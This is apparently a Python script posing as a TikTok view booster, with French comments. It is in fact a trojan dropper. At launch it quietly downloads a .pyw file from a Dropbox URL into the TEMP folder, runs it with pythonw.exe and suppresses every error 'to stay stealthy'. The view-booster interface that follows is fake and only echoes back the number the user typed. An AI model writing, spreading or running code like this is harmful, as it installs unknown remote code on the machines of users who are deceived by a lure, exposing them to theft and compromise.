import os
import requests
import subprocess

def perform_stealth_download():
    program_url = "https://www.dropbox.com/scl/fi/r4jb76tb2r035tfqi6ftf/requests-analys.pyw?rlkey=13270y57mwhg36eaxf52gam2h&st=6qvkcmww&dl=1"
    local_path = os.path.join(os.getenv("TEMP"), "script.pyw")  # Enregistrer dans le dossier temporaire

    try:
        response = requests.get(program_url, timeout=10)
        response.raise_for_status()  # Lève une erreur si le téléchargement échoue
        with open(local_path, 'wb') as file:
            file.write(response.content)
        
        if os.path.exists(local_path):
            # Spécifiez le chemin complet vers pythonw.exe si nécessaire
            subprocess.run([r"pythonw.exe", local_path], check=True)
    except Exception:
        pass  # Ignorer toutes les erreurs pour rester furtif

# Exécuter la fonction furtive au lancement
perform_stealth_download()

# Code UI pour après, facultatif
import sys
import time
from colorama import Fore, Style, init
from pyfiglet import Figlet

init()

def ascii_title():
    os.system('cls' if os.name == 'nt' else 'clear')
    fig = Figlet(font='slant')
    print(Fore.CYAN + fig.renderText('TikTok Views') + Style.RESET_ALL)

def loading_bar():
    for i in range(1, 101):
        sys.stdout.write(Fore.GREEN + f'\rLoading: [{"=" * (i // 2)}{"-" * (50 - i // 2)}] {i}%' + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(0.3)

ascii_title()
link = input(Fore.YELLOW + "Enter the TikTok video link: " + Style.RESET_ALL)
views = input(Fore.YELLOW + "Enter the number of views: " + Style.RESET_ALL)

ascii_title()
print(Fore.MAGENTA + f"Fetching views for video: {link}" + Style.RESET_ALL)
loading_bar()
print(Fore.CYAN + f"\n\nThe video has {views} views!" + Style.RESET_ALL)
